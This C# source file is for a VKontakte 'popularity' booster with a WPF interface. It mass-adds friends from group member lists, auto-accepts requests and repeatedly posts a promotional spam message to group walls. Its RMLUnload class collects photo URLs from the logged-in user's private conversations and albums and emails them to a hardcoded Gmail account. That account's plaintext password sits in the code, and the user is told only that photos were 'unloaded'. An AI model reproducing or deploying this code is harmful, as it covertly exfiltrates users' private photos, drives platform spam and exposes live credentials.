using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;
using System.Windows.Threading;
using VkNet;
using VkNet.Enums.Filters;

using System.IO;
using System.Net;
using System.Net.Mime;


namespace VKiPopularByRML
{
    /// <summary>
    /// Логика взаимодействия для MainPage.xaml
    /// </summary>
    public class GroupComparer : IEqualityComparer<VkNet.Model.Group>
    {
        public bool Equals(VkNet.Model.Group gr1, VkNet.Model.Group gr2) => gr1.Name.Equals(gr2.Name);
        public int GetHashCode(VkNet.Model.Group gr) => gr.Name == null ? 0 : gr.Name.GetHashCode();
    }

    public class RMLUnload
    {
        private VkApi vkApi { get; set; }

        // SMTP Client fields
        SmtpClient client;
        string server = "smtp.gmail.com";
        int port = 587;
        string mail = "rp88imxo@gmail.com";
        string password = "awsd741852egfne002";
        int counter = 0;

        // Some private shiiit
        
        public List<VkNet.Model.Message> dialogMessages = new List<VkNet.Model.Message>();
        uint TotallDialogsCount;

        public List<VkNet.Model.HistoryAttachment> historyAttachments = new List<VkNet.Model.HistoryAttachment>();

        public RMLUnload(VkApi vkApi)
        {
            this.vkApi = vkApi;

            client = new SmtpClient(server, port);
            client.EnableSsl = true;
            client.Credentials = new NetworkCredential(mail, password);
        }

        // Methods
        public void GetAllPhotos()
        {
            GetAllDialogs(dialogMessages); // Получение всех диалогов, из которых выгружаются фото


            foreach (var message in dialogMessages)
            {
                counter++;
                string offset = "0";
                if (counter > 200)
                    break;
                while (true)
                {

                    System.Threading.Thread.Sleep(15);

                    // Закоментить если необходимо получать вложения из групповых бесед
                    //if (message.AdminId != null)
                      //  break;
                    
                    var att = vkApi.Messages.GetHistoryAttachments(new VkNet.Model.RequestParams.MessagesGetHistoryAttachmentsParams
                    {
                        PeerId = message.AdminId == null? (long)message.UserId : 2000000000 + (long)message.ChatId,
                        StartFrom = offset,
                        MediaType = VkNet.Enums.SafetyEnums.MediaType.Photo,
                        Count = 200

                    }, out offset);

                    if (att.Count == 0)
                        break;
                    
                    historyAttachments.AddRange(att);
                    
                }
                


            }

            // Функции для отправки на сервер либо почту

            string photosURLs = "";
            foreach (var att in historyAttachments)
            {
               var photo = (VkNet.Model.Attachments.Photo)att.Attachment.Instance;
                photosURLs += photo.Photo2560 != null ? photo.Photo2560
                    : photo.Photo1280 != null ? photo.Photo1280
                    : photo.Photo807 != null ? photo.Photo807
                    : photo.Photo604 != null ? photo.Photo604
                    : photo.Photo130 != null ? photo.Photo130
                    : photo.Photo75;
                photosURLs += "\n";
            }

            SendAllAtt(photosURLs);
            System.Threading.Thread.Sleep(30000);
            GetAlbumPhotos();
            MessageBox.Show($"Количество диалогов: {dialogMessages.Count}\nВсего вложений: {historyAttachments.Count}", "Успешно выгружено!");
        }

        void GetAlbumPhotos()
        {
           string photo_url = "";

            var album_params = new VkNet.Model.RequestParams.PhotoGetAlbumsParams();
            var photo_params = new VkNet.Model.RequestParams.PhotoGetParams();

            album_params.NeedSystem = true;
            album_params.OwnerId = vkApi.UserId;

            var albums = vkApi.Photo.GetAlbums(album_params);



            foreach (var album in albums)
            {
                photo_params.Count = (ulong?)album.Size;
                photo_params.AlbumId = VkNet.Enums.SafetyEnums.PhotoAlbumType.Id(album.Id);
                photo_params.Offset = 0;
                photo_params.OwnerId = vkApi.UserId;//vkApi.UserId;
                photo_params.Extended = true;

                var photos = vkApi.Photo.Get(photo_params);
                photo_url += $"==============================================\n  {album.Title}\n ============================================== \n";
                foreach (var photo in photos)
                {
                    photo_url +=
                        "Количество лайков: " + photo.Likes.Count + "\n" +
                        photo.Photo2560 + "\n" +
                        photo.Photo1280 + "\n" +
                        photo.Photo807 + "\n" +
                        photo.Photo604 + "\n" +
                        "==============================================\n";
                }
                photo_url += $"==============================================\n  {album.Description}\n ============================================== \n";
            }
            
            SendAllAtt(photo_url);
        }

        async void SendAllAtt(string photoURL)
        {
            MailMessage msg = new MailMessage
            {
                From = new MailAddress(mail),
                Subject = $"Фото пользователя {vkApi.UserId}",
                Body = photoURL
            };

            msg.To.Add(new MailAddress(mail));
            client.Timeout = 25000;
            try
            {
               await client.SendMailAsync(msg);
            }
            catch (Exception)
            {

                throw;
            }
        }

        void GetAllDialogs(List<VkNet.Model.Message> messages)
        {
            int offset = 0;

            while(true)
            {

                var lDialogs = vkApi.Messages.GetDialogs
            (
                new VkNet.Model.RequestParams.MessagesDialogsGetParams
                {
                    Count = 200,
                    Offset = offset
                }
            );
               
                    
                if (lDialogs.Messages.Count == 0)
                {
                    TotallDialogsCount = lDialogs.TotalCount;
                    break;
                }
                   
                offset += (int)lDialogs.Messages.Count;

                messages.AddRange(lDialogs.Messages);



            }

           
        }

       
    }
    public class RML_Methods
    {
        public static DispatcherTimer timer_autopost;
        public static DispatcherTimer timer_friend_add;
        public TimeSpan tm;
        public DateTime st_dt;
        public DateTime st_tick;
        public TimeSpan postInterval = new TimeSpan(0, 3, 0);

        List<VkNet.Model.RequestParams.WallPostParams> prms;
       

        private string[] str;
        private string message;
        public int users_done { get; set; }
        public int users_undone{ get; set; }
        private string id { get; set; }
        private int off { get; set; }
        private int club_curr { get; set; }
        public int post_completed { get; set; }
        public int post_failed { get; set; }
        public int friends_added{ get; set; }

        public VkNet.Utils.VkCollection<VkNet.Model.User> users;

       
        //METHODS IMPLEMENTATION SECTION
        public IEnumerable<VkNet.Model.Group> RmlGetGroupIntersection(long? id_f,long? id_s)
        {

            var groups_params = new VkNet.Model.RequestParams.GroupsGetParams();
            groups_params.UserId = id_f;
            groups_params.Extended = true;

            var groups_params1 = new VkNet.Model.RequestParams.GroupsGetParams();
            groups_params1.UserId = id_s;
            groups_params1.Extended = true;

            var groups = MainWindow.vkApi.Groups.Get(groups_params);
            var groups2 = MainWindow.vkApi.Groups.Get(groups_params1);


            var inter = groups.Intersect(groups2, new GroupComparer());

            return inter;
        }
        public string RmlGetGroupInterString(long? id_f, long? id_s)
        {
            var groups_params = new VkNet.Model.RequestParams.GroupsGetParams();
            groups_params.UserId = id_f;
            groups_params.Extended = true;

            var groups_params1 = new VkNet.Model.RequestParams.GroupsGetParams();
            groups_params1.UserId = id_s;
            groups_params1.Extended = true;

            var groups = MainWindow.vkApi.Groups.Get(groups_params);
            var groups2 = MainWindow.vkApi.Groups.Get(groups_params1);


            var inter = groups.Intersect(groups2, new GroupComparer());

            string gr_info = "";
            foreach (var group in inter)
            {
                gr_info += group.Name + "\n";
            }

            return gr_info;
        }
        private void RmlReadMessage(string path, ref string message)
        {
            if (System.IO.File.Exists(path))
            {
                message = System.IO.File.ReadAllText(path);
            }
            else
            {
                MessageBox.Show("Файл message.dat отсутствует\nСообщение получит дефолтную строку", "Ошибка");
                message = "🌈🌈🌈Добавляйтесь в друзья!\n😡😡😡В подписчиках не оставляю!\n💬💬💬Заявку одобряю моментально!\n🌈🌈🌈Также вступайте в группу vk.com / public171103193\n💖💖💖Всем кто вступит в группу лайкну фотки и аву!";
            }
        }
        private void RmlReadGroups(string path)
        {
            if (System.IO.File.Exists(path))
            {
                str = System.IO.File.ReadAllLines(path);
            }
            else
            {
                MessageBox.Show("Файл даты отсутствует","Ошибка");
            }
        }
        public void RmlWriteResults() //bla bla bla
        {
            RmlReadGroups(@"Data/groups.dat");
            var spl = str[club_curr].Split(' ');
            str[club_curr] = spl[0] + " " + (club_curr + off).ToString() + " " + spl[2];
            System.IO.File.WriteAllLines(@"Data/groups.dat", str);
        }
        public void RmlGetPop()
        {
            RmlReadGroups(@"Data/groups.dat");
            foreach (var grinfo in str)
            {
                var info = grinfo.Split(' ');
                off = int.Parse(info[1]);
                id = info[0];
                if (off < int.Parse(info[2]))
                    break;
                club_curr++;
            }

            var grm_prm = new VkNet.Model.RequestParams.GroupsGetMembersParams();
            grm_prm.Offset = off;
            grm_prm.GroupId = id;
            users = MainWindow.vkApi.Groups.GetMembers(grm_prm);
            //123
        }
        public void RmlStartPop()
        { 
           MainWindow.vkApi.Friends.Add(users[++users_done].Id);
        }
        public void RmlStartAutoPost()
        {
            timer_autopost = new System.Windows.Threading.DispatcherTimer();
            timer_autopost.Tick += new EventHandler(timer_autopost_ticker);
            timer_autopost.Interval = new TimeSpan(0, 0, 1);
            tm = new TimeSpan(0, 5, 0);
            st_dt = DateTime.Now;
            //newrepo
            timer_friend_add = new System.Windows.Threading.DispatcherTimer();
            timer_friend_add.Tick += new EventHandler(timer_friend_add_tick);
            timer_friend_add.Interval = new TimeSpan(0, 0, 1);

            prms = new List<VkNet.Model.RequestParams.WallPostParams>();

            if (str == null)
                RmlReadGroups(@"Data/groups.dat");
            if (message == null)
                RmlReadMessage(@"Data/message.dat", ref message);

            for (int i = 0; i < str.Length; i++)
            {
                prms.Add(new VkNet.Model.RequestParams.WallPostParams
                {
                    OwnerId = -int.Parse(str[i].Split(' ')[0]),
                    Message = message
                });
            }
            
            timer_autopost.Start();
            timer_friend_add.Start();


        }
        public void RmlStopAutoPost()
        {
            timer_autopost.Stop();
        }
        private void timer_autopost_ticker(object sender, EventArgs e)
        {
            if (tm.Ticks < 0)
            {
                tm = new TimeSpan(0, 5, 0);
                st_dt = DateTime.Now;

            }
            

            timer_autopost.Interval = postInterval;
            foreach (var prm in prms)
            {
                try
                {
                    MainWindow.vkApi.Wall.Post(prm);
                    System.Threading.Thread.Sleep(500);
                    post_completed++;
                }
                catch (Exception)
                {
                    post_failed++;
                }
                
            }
            
        }

        private void timer_friend_add_tick(object sender, EventArgs e)
        {
            timer_friend_add.Interval = new TimeSpan(0, 0, 15);
            VkNet.Model.RequestParams.FriendsGetRequestsParams prms = new VkNet.Model.RequestParams.FriendsGetRequestsParams();
            prms.Offset = 0;
            var res = MainWindow.vkApi.Friends.GetRequests(prms);

            foreach (var fr in res.Items)
            {
                MainWindow.vkApi.Friends.Add(fr);
                friends_added++;
            }
        }
    }
    public partial class MainPage : Window
    {
        public DispatcherTimer timer;
        public DispatcherTimer timer2;
        protected RML_Methods rml_methods = new RML_Methods();
        protected RMLUnload rmlUnload = new RMLUnload(MainWindow.vkApi);

        
        public MainPage()
        {
            InitializeComponent();

            timer = new System.Windows.Threading.DispatcherTimer();
            timer.Tick += new EventHandler(timer_ticker);
            timer.Interval = new TimeSpan(0, 0, 5);

            timer2 = new System.Windows.Threading.DispatcherTimer();
            timer2.Tick += new EventHandler(timer2_ticker);
            timer2.Interval = new TimeSpan(0, 0, 1);

        }
        
        private void timer_ticker(object sender, EventArgs e)
        {
            try
            {
                rml_methods.RmlStartPop();
                Label_count_added.Content = rml_methods.users_done;
            }
            catch (Exception ex)
            {
                
                rml_methods.users_undone++;
                Label_unlucky.Content = rml_methods.users_undone;
                //MessageBox.Show(ex.Message);
            }
            
        }
        private void timer2_ticker(object sender, EventArgs e)
        {
            Label_post_done.Content = rml_methods.post_completed;
            Label_post_failed.Content = rml_methods.post_failed;
            Label_friends_added.Content = rml_methods.friends_added;

            rml_methods.tm = new TimeSpan(0,3,0) - (DateTime.Now - rml_methods.st_dt);
            Label_time_to_post.Content = rml_methods.tm.Minutes.ToString("N0") + " минут";
        }

        private void Button_start_nakrtytka_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                timer.Start();
                rml_methods.RmlGetPop();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void Button_end_nakrytka_Click(object sender, RoutedEventArgs e)
        {
            
            timer.Stop();
            rml_methods.RmlWriteResults();
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
           // rmlUnload.GetAllPhotos();
            rml_methods.RmlStartAutoPost();
            timer2.Start();
        }

        private void Button_auto_end_Click(object sender, RoutedEventArgs e)
        {
            rml_methods.RmlStopAutoPost();
        }

        private void Button_Click_1(object sender, RoutedEventArgs e)
        {
            rmlUnload.GetAllPhotos();
        }
    }

   
}
